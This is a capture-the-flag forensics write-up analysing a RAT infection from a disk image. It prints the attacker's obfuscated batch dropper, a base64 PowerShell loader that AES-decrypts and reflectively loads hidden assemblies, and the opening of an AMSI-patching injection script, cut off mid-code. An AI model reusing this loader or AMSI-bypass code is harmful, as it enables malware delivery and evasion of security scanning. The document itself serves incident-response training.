# Kraken

<img width="1598" height="657" alt="image" src="https://github.com/user-attachments/assets/5966b0c8-f6db-45c4-9597-65ae6f93ecb4" />


**Description**: Our SOC detected an emerging RAT variant delivered via malicious file execution in its early stages, triggering an alert before C2 communication was fully established. Rapid containment prevented further exfiltration or post-exploitation activities. A full forensic triage was conducted to analyze persistence mechanisms and C2 infrastructure, enabling comprehensive IOC extraction to provide them to our threat intelligence platform for enhanced detection and proactive hunting.

This challenge will provide an file artifact evidence .e01, our target is find the first initial access file in file system, deobfuscated payload in file system, trace log, reverse engineer, this will enhance our skill after done this sherlock lab.

### First we need to create timeline of all event in this lab, when the system first attacked by malicious app, throught we can finish the task 1: What was the exact date and time the malicious file was executed by the user?

-> We can identify this by some artifact relate to execution file by user, like Recent file/Recent Docs registry key, prefetch or use file journaling to see the object change and file create to make the timeline to combine with some first artifact to answer => When i check recent file, i can see a file conf.js.lnk "2025-06-13 14:43:27" (a file create after user execution the original file by double click into it), and when i check in event view, i have see the malicious event in Powershell Operational, with event id 4104 script block execution is logged at 13/06/2025 14:43:36, so i can understand the timeline of first attack by attacker is around "14:43:20 -> 14:43:36", but the only file user execution in one range is conf.js. Moreover when i check in Prefetch parse in timeline.explorer, we can see at exact this time, file wscript.exe have execution, all of that can prove the file conf.js is the first file user double click to start the attack, so idiot =)))).

<img width="1293" height="209" alt="image" src="https://github.com/user-attachments/assets/4d635dd8-7770-4414-af97-acf1d9ca20ee" />

File `Config.js` have create and data extend

<img width="1211" height="28" alt="image" src="https://github.com/user-attachments/assets/47fb4f3b-a335-43e2-9d26-33c5d8b4394c" />

At exact this time: `14:43:27`, we can see wscript.exe execution and create a prefetch file -> prove of the first file use to initial access victim is conf.js at `14:43:27`.

<img width="1527" height="245" alt="image" src="https://github.com/user-attachments/assets/8b12b1ec-73b5-4f1d-8f1a-6e4d4f1118f9" />


### Task2: During the initial stage of execution, what is the name of the first file dropped by the malicious file?

-> Check the mft parse file, we can see after the file conf.js first execution, we will see the one file have created second later, is file temp_993805.bat

<img width="1838" height="382" alt="image" src="https://github.com/user-attachments/assets/9bf8257b-1f85-44cb-bedc-957bc035526c" />


### Task 3: During the initial stage of execution, The malicious file performed in-memory patching of a critical security function by overwriting it with a 6-byte sequence that forces the function to return zero. What is this hexadecimal byte sequence?

This file we need to move into several step to answer this task, first we need to deobfuscated a malicious file in folder user administrator, the file we need to deobfuscated is `dwm.bat`, 

<img width="1919" height="886" alt="image" src="https://github.com/user-attachments/assets/b06dbf69-d50a-4961-9711-c2883d88bf98" />

This file has many layered obfuscated the main content of file, attacker often use this to bypass anti virus system in Windows. First layered of this obfuscated, they use a enviroment variable to wrapper the command, we can use cyberchef to unwrapp this:

<img width="1539" height="809" alt="image" src="https://github.com/user-attachments/assets/770d5e4c-1ce1-45cb-a725-3f52d1ec502a" />

After remove a wrapper with `%argui%`, we can see the command `@echo off` - use hide the text of the commands being executed. But we can see it have another wrapper with regex random in `%...%`, i make a little script to do unwrapper all of this wrapper:

```python
import re
import sys
from pathlib import Path


if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} <input_obfuscated_bat> [output_bat]")
    sys.exit(1)

inp = Path(sys.argv[1])
outp = Path(sys.argv[2]) if len(sys.argv) >= 3 else Path("stage1_expanded_batch.bat")

text = inp.read_text(errors="ignore")
text = text.replace("^", "")

# Các biến thật cần giữ, không được xóa như noise
PROTECTED = {
    "userprofile",
    "sourcefile",
    "systemdrive",
    "appdata",
    "localappdata",
    "temp",
    "tmp",
    "windir",
    "username",
}

percent_var_re = re.compile(r"%([A-Za-z_][A-Za-z0-9_]*)%")

# Dòng final command thường là chuỗi %var%%var%%var%...
# Dòng này không phải noise, phải giữ để expand sau.
macro_chain_re = re.compile(
    r'^\s*(?:%[A-Za-z_][A-Za-z0-9_]*%)+\s*$'
)

cleaned_lines = []

for raw_line in text.splitlines():
    line = raw_line

    stripped = line.strip()

    # Giữ nguyên hidden payloads
    if stripped.startswith(":::") or stripped.startswith(":: "):
        cleaned_lines.append(line)
        continue

    # Giữ nguyên dòng macro-chain final command
    if macro_chain_re.match(stripped):
        cleaned_lines.append(line)
        continue

    def strip_noise(m):
        name = m.group(1)

        # Giữ biến môi trường thật
        if name.lower() in PROTECTED:
            return m.group(0)

        # Còn lại coi là %variable_noise%
        return ""

    line = percent_var_re.sub(strip_noise, line)

    # Một số đoạn có %!% hoặc dạng tương tự dùng làm empty noise
    line = re.sub(r"%[^%\r\n]*%", "", line)

    cleaned_lines.append(line)


env = {}
expanded_lines = []
powershell_commands = []


def expand_cmd_vars(s: str, unknown_to_empty: bool = True) -> str:
    """
    Emulate phần cần thiết của CMD expansion:
    - !var! delayed expansion
    - %var% normal expansion
    Không execute gì cả.
    """
    for _ in range(300):
        old = s

        # !var!
        s = re.sub(
            r"!([A-Za-z0-9_]+)!",
            lambda m: env.get(m.group(1), "" if unknown_to_empty else m.group(0)),
            s
        )

        # %var%
        s = re.sub(
            r"%([A-Za-z_][A-Za-z0-9_]*)%",
            lambda m: env.get(m.group(1), "" if unknown_to_empty else m.group(0)),
            s
        )

        # undefined weird %...% noise
        if unknown_to_empty:
            s = re.sub(r"%[^%\r\n]*%", "", s)

        if s == old:
            break

    return s


def parse_assignment(line: str):
    """
    Match:
      set "abc=value"
      !somevar! "abc=value"    sau đó !somevar! sẽ expand thành set
      "abc=value"              fallback nếu đã clean mất chữ set
    """
    line_expanded = expand_cmd_vars(line.strip(), unknown_to_empty=False)

    patterns = [
        r'^\s*set\s+"([^=]+)=(.*)"\s*$',
        r'^\s*![A-Za-z0-9_]+!\s+"([^=]+)=(.*)"\s*$',
        r'^\s*%[A-Za-z0-9_]+%\s+"([^=]+)=(.*)"\s*$',
        r'^\s*"([^=]+)=(.*)"\s*$',
    ]

    for pat in patterns:
        m = re.match(pat, line_expanded, re.I)
        if m:
            return m.group(1), m.group(2), line_expanded

    return None, None, line_expanded


for raw_line in cleaned_lines:
    stripped = raw_line.strip()

    name, value, line_after_light_expand = parse_assignment(raw_line)

    if name is not None:
        value = expand_cmd_vars(value, unknown_to_empty=True)
        env[name] = value
        expanded_lines.append(f'set "{name}={value}"')
        continue

    # Nếu là dòng macro-chain, expand thành PowerShell command thật
    if macro_chain_re.match(stripped):
        cmd = expand_cmd_vars(stripped, unknown_to_empty=True)
        expanded_lines.append(cmd)

        if "powershell" in cmd.lower() or "frombase64string" in cmd.lower():
            powershell_commands.append(cmd)

        continue

    expanded = expand_cmd_vars(raw_line, unknown_to_empty=False)
    expanded_lines.append(expanded)

    if "powershell" in expanded.lower() or "frombase64string" in expanded.lower():
        powershell_commands.append(expanded)


outp.write_text("\n".join(expanded_lines), encoding="utf-8", errors="ignore")

print(f"[+] Saved expanded batch: {outp}")

if powershell_commands:
    ps_cmd = powershell_commands[0]
    Path("stage1_powershell_command.txt").write_text(ps_cmd, encoding="utf-8")

    print("[+] Found PowerShell command")
    print("[+] Saved: stage1_powershell_command.txt")
    print()
    print(ps_cmd[:1000])

    m = re.search(r"FromBase64String\(['\"]([^'\"]+)['\"]\)", ps_cmd, re.I | re.S)
    if m:
        b64 = m.group(1)
        Path("stage1_powershell_base64_only.txt").write_text(b64, encoding="utf-8")
        print()
        print(f"[+] Extracted Base64 only: stage1_powershell_base64_only.txt")
        print(f"[+] Base64 length: {len(b64)}")
else:
    print("[!] No PowerShell command found.")
    print("[!] Check that the input still contains the macro-chain line like %avdbuu%%ikrsqh%%mnxlww%...")
```
When we check into the output file, first we can see attacker implement set an enviroment to start attack: 

```powershell
@echo off
if not DEFINED ebnxmRzKvebnxm set ebnxmRzKvebnxm=1 && start "" /min "%~dpnx0" %* && exit
set "sourceFile=%~dp0%~nx0"
copy "%sourceFile%" "%userprofile%\dwm.bat" >nul"
setlocal enabledelayedexpansion
set "mvyks=s"
set "czwli=t"
set "pzubyuzscxptsyicikccmzxcq=!mvyks!e!czwli!"
!pzubyuzscxptsyicikccmzxcq! "prymud=enhhICAgICB6eGEgICAgI"
!pzubyuzscxptsyicikccmzxcq! "ufxiuw=LUV4cHJlc3Npb24gJGhuc"
!pzubyuzscxptsyicikccmzxcq! "skygrc=LWpvaW56eGEgJycpKHp4Y"
```

> This step attacker start to set up an enviroment to start attack:
> - First, if variable `ebnxmRzKvebnxm` is not define, so set `ebnxmRzKvebnxm=1` -> ý nghĩa của việc nay là attacker thực hiện tạo 1 relaunch nhưng tránh vô hạn, thực hiện lại cho file nằm trong biến môi trường `%~dpnx0`, và chạy nó trong 1 cửa sổ minimized để tránh bị victim thấy thực hiện mở cmd.
> - Tiếp theo attacker thực hiện định nghĩa `enviroment variable` như sau:
> `%~dp0`: folder chứa file batch hiện tại
> `%~nx0`: File batch hiện tại
> `%~dpnx0`: full path đến file .bat
>  Lúc này, mình có thể thấy attacker cũng thực hiện set file path của file nằm trên disk của file system của victim, tại `%userprofile%\dwm.bat` -> Tức là `C:\Administrator\dwm.bat`
> Cuối cùng là attacker thực hiện set cơ chế dùng biến kiểu: `!var!` bằng lệnh `setlocal enabledelayedexpansion` -> để thực hiện ghép các pattern base64 thành 1 lệnh powershell loader hoàn chỉnh.

Sau đó mình sẽ thấy 1 lệnh thực hiện decode và execution cục payload base64, để bắt đầu cho stage1: nằm ở phần cuối, nếu chúng ta thực hiện clean các biến môi trường rác đúng:

<details>
  <summary>
    Command Decode and execution base64 payload stage1
  </summary>
  
```powershell
  set "\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noprofile -windowstyle hidden -ep bypass  -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('DQoNCiR6bWhsaCA9IEAnDQokbHl3eXp4YXVwbm5penhhd2pud3Z6eGF3ID0gJHp4YWVudjpVenhhU0VSTkF6eGFNRTskeHp4YW1qY2x3enhhcHZmbm96eGFnZmRmIHp4YT0gIkM6enhhXFVzZXJ6eGFzXCRseXp4YXd5dXBuenhhbml3am56eGF3dndcZHp4YXdtLmJhenhhdCI7aWZ6eGEgKFRlc3p4YXQtUGF0enhhaCAkeG16eGFqY2x3cHp4YXZmbm9nenhhZmRmKSB6eGF7ICAgIHp4YVdyaXRlenhhLUhvc3R6eGEgIkJhdHp4YWNoIGZpenhhbGUgZm96eGF1bmQ6IHp4YSR4bWpjenhhbHdwdmZ6eGFub2dmZHp4YWYiIC1Genhhb3JlZ3J6eGFvdW5kQ3p4YW9sb3IgenhhQ3lhbjt6eGEgICAgJHp4YWZpbGVMenhhaW5lcyB6eGE9IFtTeXp4YXN0ZW0uenhhSU8uRml6eGFsZV06Onp4YVJlYWRBenhhbGxMaW56eGFlcygkeHp4YW1qY2x3enhhcHZmbm96eGFnZmRmLHp4YSBbU3lzenhhdGVtLlR6eGFleHQuRXp4YW5jb2RpenhhbmddOjp6eGFVVEY4KXp4YTsgICAgenhhZm9yZWF6eGFjaCAoJHp4YWxpbmUgenhhaW4gJGZ6eGFpbGVMaXp4YW5lcykgenhheyAgICB6eGEgICAgaXp4YWYgKCRsenhhaW5lIC16eGFtYXRjaHp4YSAnXjo6enhhOiA/KC56eGErKSQnKXp4YSB7ICAgenhhICAgICB6eGEgICAgV3p4YXJpdGUtenhhSG9zdCB6eGEiSW5qZXp4YWN0aW9uenhhIGNvZGV6eGEgZGV0ZXp4YWN0ZWQgenhhaW4gdGh6eGFlIGJhdHp4YWNoIGZpenhhbGUuIiB6eGEtRm9yZXp4YWdyb3VuenhhZENvbG96eGFyIEN5YXp4YW47ICAgenhhICAgICB6eGEgICAgdHp4YXJ5IHsgenhhICAgICB6eGEgICAgIHp4YSAgICAgenhhJGRlY296eGFkZWRCeXp4YXRlcyA9enhhIFtTeXN6eGF0ZW0uQ3p4YW9udmVyenhhdF06OkZ6eGFyb21CYXp4YXNlNjRTenhhdHJpbmd6eGEoJG1hdHp4YWNoZXNbenhhMV0uVHJ6eGFpbSgpKXp4YTsgICAgenhhICAgICB6eGEgICAgIHp4YSAgJGluenhhamVjdGl6eGFvbkNvZHp4YWUgPSBbenhhU3lzdGV6eGFtLlRleHp4YXQuRW5jenhhb2Rpbmd6eGFdOjpVbnp4YWljb2RlenhhLkdldFN6eGF0cmluZ3p4YSgkZGVjenhhb2RlZEJ6eGF5dGVzKXp4YTsgICAgenhhICAgICB6eGEgICAgIHp4YSAgV3JpenhhdGUtSG96eGFzdCAiSXp4YW5qZWN0enhhaW9uIGN6eGFvZGUgZHp4YWVjb2RlenhhZCBzdWN6eGFjZXNzZnp4YXVsbHkuenhhIiAtRm96eGFyZWdyb3p4YXVuZENvenhhbG9yIEd6eGFyZWVuO3p4YSAgICAgenhhICAgICB6eGEgICAgIHp4YSBXcml0enhhZS1Ib3N6eGF0ICJFeHp4YWVjdXRpenhhbmcgaW56eGFqZWN0aXp4YW9uIGNvenhhZGUuLi56eGEiIC1Gb3p4YXJlZ3JvenhhdW5kQ296eGFsb3IgWXp4YWVsbG93enhhOyAgICB6eGEgICAgIHp4YSAgICAgenhhICBJbnZ6eGFva2UtRXp4YXhwcmVzenhhc2lvbiB6eGEkaW5qZXp4YWN0aW9uenhhQ29kZTt6eGEgICAgIHp4YSAgICAgenhhICAgICB6eGEgYnJlYXp4YWs7ICAgenhhICAgICB6eGEgICAgfXp4YSBjYXRjenhhaCB7ICB6eGEgICAgIHp4YSAgICAgenhhICAgIFd6eGFyaXRlLXp4YUhvc3QgenhhIkVycm96eGFyIGR1cnp4YWluZyBkenhhZWNvZGl6eGFuZyBvcnp4YSBleGVjenhhdXRpbmd6eGEgaW5qZXp4YWN0aW9uenhhIGNvZGV6eGE6ICRfInp4YSAtRm9yenhhZWdyb3V6eGFuZENvbHp4YW9yIFJlenhhZDsgICB6eGEgICAgIHp4YSAgICB9enhhOyAgICB6eGEgICAgfXp4YTsgICAgenhhfTt9IGV6eGFsc2Uge3p4YSAgICAgenhhIFdyaXR6eGFlLUhvc3p4YXQgIlN5enhhc3RlbSB6eGFFcnJvcnp4YTogQmF0enhhY2ggZml6eGFsZSBub3p4YXQgZm91enhhbmQ6ICR6eGF4bWpjbHp4YXdwdmZuenhhb2dmZGZ6eGEiIC1Gb3p4YXJlZ3JvenhhdW5kQ296eGFsb3IgUnp4YWVkOyAgenhhICBleGl6eGF0O307Znp4YXVuY3Rpenhhb24gZ2J6eGFwcXVjeHp4YXJjZnhjenhhcWNjKCR6eGFwYXJhbXp4YV92YXIpenhhewkkYWV6eGFzX3Zhcnp4YT1bU3lzenhhdGVtLlN6eGFlY3VyaXp4YXR5LkNyenhheXB0b2d6eGFyYXBoeXp4YS5BZXNdenhhOjpDcmV6eGFhdGUoKXp4YTsJJGFlenhhc192YXJ6eGEuTW9kZXp4YT1bU3lzenhhdGVtLlN6eGFlY3VyaXp4YXR5LkNyenhheXB0b2d6eGFyYXBoeXp4YS5DaXBoenhhZXJNb2R6eGFlXTo6Q3p4YUJDOwkkenhhYWVzX3Z6eGFhci5QYXp4YWRkaW5nenhhPVtTeXN6eGF0ZW0uU3p4YWVjdXJpenhhdHkuQ3J6eGF5cHRvZ3p4YXJhcGh5enhhLlBhZGR6eGFpbmdNb3p4YWRlXTo6enhhUEtDUzd6eGE7CSRhZXp4YXNfdmFyenhhLktleT16eGFbU3lzdHp4YWVtLkNvenhhbnZlcnR6eGFdOjpGcnp4YW9tQmFzenhhZTY0U3R6eGFyaW5nKHp4YSdJbW9jenhhTkVuVVp6eGFiSEJtYXp4YVhJQnRvenhheTdYM0h6eGFDcjlRc3p4YUNESkFVenhhbGtxNDN6eGFxWUZnPXp4YScpOwkkenhhYWVzX3Z6eGFhci5JVnp4YT1bU3lzenhhdGVtLkN6eGFvbnZlcnp4YXRdOjpGenhhcm9tQmF6eGFzZTY0U3p4YXRyaW5nenhhKCdXQ3B6eGFRVkdxY3p4YStFNFNOenhhSGZLWVZ6eGE1alZRPXp4YT0nKTsJenhhJGRlY3J6eGF5cHRvcnp4YV92YXI9enhhJGFlc196eGF2YXIuQ3p4YXJlYXRlenhhRGVjcnl6eGFwdG9yKHp4YSk7CSRyenhhZXR1cm56eGFfdmFyPXp4YSRkZWNyenhheXB0b3J6eGFfdmFyLnp4YVRyYW5zenhhZm9ybUZ6eGFpbmFsQnp4YWxvY2soenhhJHBhcmF6eGFtX3Zhcnp4YSwgMCwgenhhJHBhcmF6eGFtX3Zhcnp4YS5MZW5nenhhdGgpOwl6eGEkZGVjcnp4YXlwdG9yenhhX3Zhci56eGFEaXNwb3p4YXNlKCk7enhhCSRhZXN6eGFfdmFyLnp4YURpc3Bvenhhc2UoKTt6eGEJJHJldHp4YXVybl92enhhYXI7fWZ6eGF1bmN0aXp4YW9uIG1venhhZWdzemx6eGFqYnR1dXp4YXF0eSgkenhhcGFyYW16eGFfdmFyKXp4YXsJJGt0enhhdW15Z2p6eGFndm95bXp4YXBkdT1OenhhZXctT2J6eGFqZWN0IHp4YVN5c3RlenhhbS5JTy56eGFNZW1vcnp4YXlTdHJlenhhYW0oLCR6eGFwYXJhbXp4YV92YXIpenhhOwkkZ2J6eGFuYWNweHp4YWhianZzenhhb3hhPU56eGFldy1PYnp4YWplY3QgenhhU3lzdGV6eGFtLklPLnp4YU1lbW9yenhheVN0cmV6eGFhbTsJJHp4YWhneGV2enhhZWhkZXZ6eGFkaGpzdHp4YT1OZXctenhhT2JqZWN6eGF0IFN5c3p4YXRlbS5JenhhTy5Db216eGFwcmVzc3p4YWlvbi5HenhhWmlwU3R6eGFyZWFtKHp4YSRrdHVtenhheWdqZ3Z6eGFveW1wZHp4YXUsIFtJenhhTy5Db216eGFwcmVzc3p4YWlvbi5Denhhb21wcmV6eGFzc2lvbnp4YU1vZGVdenhhOjpEZWN6eGFvbXByZXp4YXNzKTsJenhhJGhneGV6eGF2ZWhkZXp4YXZkaGpzenhhdC5Db3B6eGF5VG8oJHp4YWdibmFjenhhcHhoYmp6eGF2c294YXp4YSk7CSRoenhhZ3hldmV6eGFoZGV2ZHp4YWhqc3QuenhhRGlzcG96eGFzZSgpO3p4YQkka3R1enhhbXlnamd6eGF2b3ltcHp4YWR1LkRpenhhc3Bvc2V6eGEoKTsJJHp4YWdibmFjenhhcHhoYmp6eGF2c294YXp4YS5EaXNwenhhb3NlKCl6eGE7CSRnYnp4YW5hY3B4enhhaGJqdnN6eGFveGEuVHp4YW9BcnJhenhheSgpO316eGFmdW5jdHp4YWlvbiB2enhhZXJqcmp6eGFycWRvZHp4YWJudGkoenhhJHBhcmF6eGFtX3Zhcnp4YSwkcGFyenhhYW0yX3Z6eGFhcil7CXp4YSRud2ZoenhhbXNocHJ6eGFqbmx0ZHp4YWQ9W1N5enhhc3RlbS56eGFSZWZsZXp4YWN0aW9uenhhLkFzc2V6eGFtYmx5XXp4YTo6KCdkenhhYW9MJ1t6eGEtMS4uLXp4YTRdIC1qenhhb2luICd6eGEnKShbYnp4YXl0ZVtdenhhXSRwYXJ6eGFhbV92YXp4YXIpOwkkenhhbnVpdWd6eGFzb2xpcXp4YXp4amZ6enhhPSRud2Z6eGFobXNocHp4YXJqbmx0enhhZGQuRW56eGF0cnlQb3p4YWludDsJenhhJG51aXV6eGFnc29saXp4YXF6eGpmenhhei5JbnZ6eGFva2UoJHp4YW51bGwsenhhICRwYXJ6eGFhbTJfdnp4YWFyKTt9enhhJGhvc3R6eGEuVUkuUnp4YWF3VUkuenhhV2luZG96eGF3VGl0bHp4YWUgPSAkenhheG1qY2x6eGF3cHZmbnp4YW9nZmRmenhhOyR3ZmR6eGFleXBlbHp4YXNha29xenhhYnI9W1N6eGF5c3RlbXp4YS5JTy5GenhhaWxlXTp6eGE6KCd0eHp4YWVUbGxBenhhZGFlUid6eGFbLTEuLnp4YS0xMV0genhhLWpvaW56eGEgJycpKHp4YSR4bWpjenhhbHdwdmZ6eGFub2dmZHp4YWYpLlNwenhhbGl0KFt6eGFFbnZpcnp4YW9ubWVuenhhdF06Ok56eGFld0xpbnp4YWUpO2ZvenhhcmVhY2h6eGEgKCRpenp4YXRuYnBqenhhZ2pwaXN6eGF2aXAgaXp4YW4gJHdmenhhZGV5cGV6eGFsc2Frb3p4YXFicikgenhhewlpZiB6eGEoJGl6dHp4YW5icGpnenhhanBpc3Z6eGFpcC5TdHp4YWFydHNXenhhaXRoKCd6eGE6OiAnKXp4YSkJewkJenhhJHd4anV6eGFhd212eXp4YWx0YnJienhhYT0kaXp6eGF0bmJwanp4YWdqcGlzenhhdmlwLlN6eGF1YnN0cnp4YWluZygzenhhKTsJCWJ6eGFyZWFrO3p4YQl9fSRvenhhd2xobmt6eGF0aXRnbnp4YXFhZXI9enhhW3N0cml6eGFuZ1tdXXp4YSR3eGp1enhhYXdtdnl6eGFsdGJyYnp4YWEuU3BsenhhaXQoJ1x6eGEnKTskZXp4YXFtaWpsenhhbHV4b2V6eGFkc3NjPXp4YW1vZWdzenhhemxqYnR6eGF1dXF0eXp4YSAoZ2JwenhhcXVjeHJ6eGFjZnhjcXp4YWNjIChbenhhQ29udmV6eGFydF06Onp4YUZyb21CenhhYXNlNjR6eGFTdHJpbnp4YWcoJG93enhhbGhua3R6eGFpdGducXp4YWFlclswenhhXSkpKTt6eGEkbGt0aXp4YWJtZ292enhhZmh6eHB6eGFxPW1vZXp4YWdzemxqenhhYnR1dXF6eGF0eSAoZ3p4YWJwcXVjenhheHJjZnh6eGFjcWNjIHp4YShbQ29uenhhdmVydF16eGE6OkZyb3p4YW1CYXNlenhhNjRTdHJ6eGFpbmcoJHp4YW93bGhuenhha3RpdGd6eGFucWFlcnp4YVsxXSkpenhhKTt2ZXJ6eGFqcmpycXp4YWRvZGJuenhhdGkgJGV6eGFxbWlqbHp4YWx1eG9lenhhZHNzYyB6eGEkbnVsbHp4YTt2ZXJqenhhcmpycWR6eGFvZGJudHp4YWkgJGxrenhhdGlibWd6eGFvdmZoenp4YXhwcSAoenhhLFtzdHJ6eGFpbmdbXXp4YV0gKCclenhhKicpKTsNCidADQoNCiRobnBodiA9ICR6bWhsaCAtcmVwbGFjZSAnenhhJywgJycNCg0KSW52b2tlLUV4cHJlc3Npb24gJGhucGh2DQo=')) | Invoke-Expression"
```
</details>

Khi chúng ta thực hiện decode base64 và unwrapper variable `zxa`, chúng ta sẽ thấy 1 script sau

<img width="1535" height="841" alt="image" src="https://github.com/user-attachments/assets/a6d88e2e-8002-4a70-8d94-155b7e4dc3e2" />

```


$zmhlh = @'
$lywyupnniwjnwvw = $env:USERNAME;$xmjclwpvfnogfdf = "C:\Users\$lywyupnniwjnwvw\dwm.bat";if (Test-Path $xmjclwpvfnogfdf) {    Write-Host "Batch file found: $xmjclwpvfnogfdf" -ForegroundColor Cyan;    $fileLines = [System.IO.File]::ReadAllLines($xmjclwpvfnogfdf, [System.Text.Encoding]::UTF8);    foreach ($line in $fileLines) {        if ($line -match '^::: ?(.+)$') {            Write-Host "Injection code detected in the batch file." -ForegroundColor Cyan;            try {                $decodedBytes = [System.Convert]::FromBase64String($matches[1].Trim());                $injectionCode = [System.Text.Encoding]::Unicode.GetString($decodedBytes);                Write-Host "Injection code decoded successfully." -ForegroundColor Green;                Write-Host "Executing injection code..." -ForegroundColor Yellow;                Invoke-Expression $injectionCode;                break;            } catch {                Write-Host "Error during decoding or executing injection code: $_" -ForegroundColor Red;            };        };    };} else {      Write-Host "System Error: Batch file not found: $xmjclwpvfnogfdf" -ForegroundColor Red;    exit;};function gbpqucxrcfxcqcc($param_var){	$aes_var=[System.Security.Cryptography.Aes]::Create();	$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;	$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	$aes_var.Key=[System.Convert]::FromBase64String('ImocNEnUZbHBmaXIBtoy7X3HCr9QsCDJAUlkq43qYFg=');	$aes_var.IV=[System.Convert]::FromBase64String('WCpQVGqc+E4SNHfKYV5jVQ==');	$decryptor_var=$aes_var.CreateDecryptor();	$return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length);	$decryptor_var.Dispose();	$aes_var.Dispose();	$return_var;}function moegszljbtuuqty($param_var){	$ktumygjgvoympdu=New-Object System.IO.MemoryStream(,$param_var);	$gbnacpxhbjvsoxa=New-Object System.IO.MemoryStream;	$hgxevehdevdhjst=New-Object System.IO.Compression.GZipStream($ktumygjgvoympdu, [IO.Compression.CompressionMode]::Decompress);	$hgxevehdevdhjst.CopyTo($gbnacpxhbjvsoxa);	$hgxevehdevdhjst.Dispose();	$ktumygjgvoympdu.Dispose();	$gbnacpxhbjvsoxa.Dispose();	$gbnacpxhbjvsoxa.ToArray();}function verjrjrqdodbnti($param_var,$param2_var){	$nwfhmshprjnltdd=[System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$param_var);	$nuiugsoliqzxjfz=$nwfhmshprjnltdd.EntryPoint;	$nuiugsoliqzxjfz.Invoke($null, $param2_var);}$host.UI.RawUI.WindowTitle = $xmjclwpvfnogfdf;$wfdeypelsakoqbr=[System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')($xmjclwpvfnogfdf).Split([Environment]::NewLine);foreach ($iztnbpjgjpisvip in $wfdeypelsakoqbr) {	if ($iztnbpjgjpisvip.StartsWith(':: '))	{		$wxjuawmvyltbrba=$iztnbpjgjpisvip.Substring(3);		break;	}}$owlhnktitgnqaer=[string[]]$wxjuawmvyltbrba.Split('\');$eqmijlluxoedssc=moegszljbtuuqty (gbpqucxrcfxcqcc ([Convert]::FromBase64String($owlhnktitgnqaer[0])));$lktibmgovfhzxpq=moegszljbtuuqty (gbpqucxrcfxcqcc ([Convert]::FromBase64String($owlhnktitgnqaer[1])));verjrjrqdodbnti $eqmijlluxoedssc $null;verjrjrqdodbnti $lktibmgovfhzxpq (,[string[]] ('%*'));
'@

$hnphv = $zmhlh -replace '', ''

Invoke-Expression $hnphv

```
Giải thích qua script này, nó sẽ thực hiện đọc qua file .bat khi nãy được drop trên disk, sau đó thực hiện tìm 2 marker nó đã set trước bên trong file `dwm.bat`
- Đầu tiên là marker `:::` -> nó thực hiện deocde base64, sau đó thực hiện remove null byte theo kiểu encoding `utf-16le` -> nên sẽ sinh ra các null byte sau khi decode, cuối cùng là nó thực thi `Invoke-Expression $injectionCode` -> thằng vào bên trong memory.
- Thứ 2 là marker `::` -> Nó chỉ đơn giản là decode base64, sau đó dùng key và iv hardcord sau đó đã đính cứng và thực hiện Load nó vào memory, nhưng mà nó sẽ được chia thành 2 cục payload và được phân tách bằng `\`

Bây giờ mình sẽ xử lý từng marker, với marker đầu tiên là `:::`, mình thực hiện decode base64 và thực hiện remove nullbyte thì sẽ hiện ra injection code:

<img width="1534" height="817" alt="image" src="https://github.com/user-attachments/assets/893302f2-d2e6-47fc-b261-ab5dd14cf0fb" />

<details>
  <summary>
    Injection Code implement Patch Memory
  </summary>

  ```powershell
function Invoke-SystemMaintenance {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$false, Position=0)]
        [switch]$LogDetails,
        [Parameter(Mandatory=$false, Position=0)]
        [switch]$OptimizePerformance
    )

    if ($LogDetails) { $VerbosePreference = "Continue" }

    try {
        function Get-WindowsAPIFunction {
            param ([string]$DllName, [string]$FunctionName)
            $moduleHandler = $Core_ModuleLoader.Invoke($null, @($DllName))
            $tempReference = New-Object IntPtr
            $handleReference = New-Object System.Runtime.InteropServices.HandleRef($tempReference, $moduleHandler)
            $Core_FunctionLoader.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$handleReference, $FunctionName))
        }

        function Get-SystemComponent {
            param (
                [Parameter(Position=0, Mandatory=$true)]
                [IntPtr]$ComponentAddress,
                [Parameter(Position=1, Mandatory=$true)]
                [Type[]]$ParameterTypes,
                [Parameter(Position=2)]
                [Type]$ReturnType = [Void]
            )
            $currentDomain = [AppDomain]::("Curren" + "tDomain")
            $assemblyName = New-Object System.Reflection.AssemblyName('SystemAssembly')
            $assemblyBuilder = $currentDomain.DefineDynamicAssembly($assemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $moduleBuilder = $assemblyBuilder.DefineDynamicModule('SystemModule', $false)
            $typeBuilder = $moduleBuilder.DefineType('SystemComponent', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $constructor = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ParameterTypes)
            $constructor.SetImplementationFlags('Runtime, Managed')
            $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParameterTypes)
            $methodBuilder.SetImplementationFlags('Runtime, Managed')
            $componentType = $typeBuilder.CreateType()
            [System.Runtime.InteropServices.Marshal]::("GetDelegate" + "ForFunctionPointer")($ComponentAddress, $componentType)
        }

        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $SystemMemory = [System.Runtime.InteropServices.Marshal]
        $WindowsAPI = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
        $bytesGetFunction = [Byte[]](0x47,0x65,0x74,0x50,0x72,0x6F,0x63,0x41,0x64,0x64,0x72,0x65,0x73,0x73)
        $bytesGetModule  = [Byte[]](0x47,0x65,0x74,0x4D,0x6F,0x64,0x75,0x6C,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65)
        $getFunctionName = [System.Text.Encoding]::ASCII.GetString($bytesGetFunction)
        $getModuleName  = [System.Text.Encoding]::ASCII.GetString($bytesGetModule)
        $Core_ModuleLoader = $WindowsAPI.GetMethod($getModuleName)
        $Core_FunctionLoader = $WindowsAPI.GetMethod($getFunctionName)
        $bytesInitialize = [Byte[]](0x41,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x69,0x61,0x6C,0x69,0x7A,0x65)
